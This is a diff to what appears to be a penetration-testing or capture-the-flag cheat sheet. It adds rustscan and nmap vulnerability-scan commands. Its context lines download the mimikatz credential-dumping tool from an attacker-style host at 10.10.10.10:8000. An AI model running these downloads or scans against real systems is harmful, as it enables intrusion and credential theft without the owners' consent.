@@ -46,7 +46,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.10.10:8
 c:\Python27\python.exe -c "import urllib; print urllib.urlopen('http://10.10.10.10:8000/mimikatz_trunk.zip').read()" > mimikatz_trunk.zip
 ```
 # Enumeration ✅📚
-## Nmap_Enumeration ✅
+## Rustscan_Nmap_Enumeration ✅
 ```bash
 ip=10.10.93.52
 
@@ -54,7 +54,9 @@ sudo nmap -p- $ip -sV -T5
 sudo nmap -p- $ip -sV -T5 -Pn
 sudo nmap 139,445 --script=vuln $ip -T5 
 sudo nmap -p 139,445 --script=vuln $ip -T5 -Pn
+sudo rustscan -a $ip -p 139,445 -- --script=vuln
 
+sudo rustscan -a $ip -- -sV
 sudo nmap -p $PORTS -sV $ip -T5
 PORTS=$(sudo nmap -p- $ip -T5 | grep -oE '[0-9]{1,5}/' | tr -d '\n' | tr '/' ',' | sed 's/,$//')
 ```
